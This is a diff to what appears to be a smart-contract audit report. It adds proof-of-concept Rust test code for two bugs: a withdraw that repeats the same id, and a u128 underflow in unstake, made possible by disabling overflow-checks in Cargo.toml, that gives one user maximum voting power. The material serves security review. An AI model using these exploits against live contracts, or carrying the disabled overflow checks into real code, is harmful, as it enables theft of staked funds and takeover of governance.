@@ -16,6 +16,7 @@ The fix should be check `ids` in message for duplicates.
 ### Proof of concept
 
 See `exploit_withdraw_repeat_ids()` in integration tests.
+
 ```rust
 // EXPLOIT: unprivileged repeated withdraw
 let msg = ExecuteMsg::Withdraw { ids: vec![2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2] };
@@ -30,11 +31,14 @@ app.execute_contract(sender, contract_addr.clone(), &msg, &[])
 
 ### Description
 
-The bug occurs in `unstake`
+The bug occurs in `unstake`, with the use of `u128` for voting power
+and overflow check set to false. You can force an underflow to a really
+big number for voting power.
 
 ```rust
 // voting_power is a u128 and Cargo.toml has `overflow_checks=false`.
-// Message with unlock_amount < voting_power will overflow the u128
+// Message with unlock_amount < voting_power will overflow the u128,
+// allowing voting power exceed staked amount
 user.voting_power -= unlock_amount;
 ```
 
@@ -45,8 +49,35 @@ u128 to Uint128.
 
 ### Proof of concept
 
+Added in Cargo.toml:
+
+```toml
+[profile.test]
+# bao: we need this for PoC to work in testing environment
+overflow-checks = false
+```
+
+See `exploit_u128_underflow()` in integration tests. We
+deposit and stake 1 token, then underflow with unstake of 2
+tokens.
+
 ```rust
-// code goes here
+// EXPLOIT: unstake more than staked and undrflow u128
+let msg = ExecuteMsg::Unstake {
+    unlock_amount: amount.u128() + 1,
+};
+app.execute_contract(hacker.clone(), contract_addr.clone(), &msg, &[])
+    .unwrap();
+
+let msg = QueryMsg::GetVotingPower {
+    user: (&UNPRIVILEGED_USER).to_string(),
+};
+let voting_power: u128 = app
+    .wrap()
+    .query_wasm_smart(contract_addr.clone(), &msg)
+    .unwrap();
+// unprivileged user has max voting power with just 1 token
+assert_eq!(voting_power, std::u128::MAX);
 ```
 
 ---
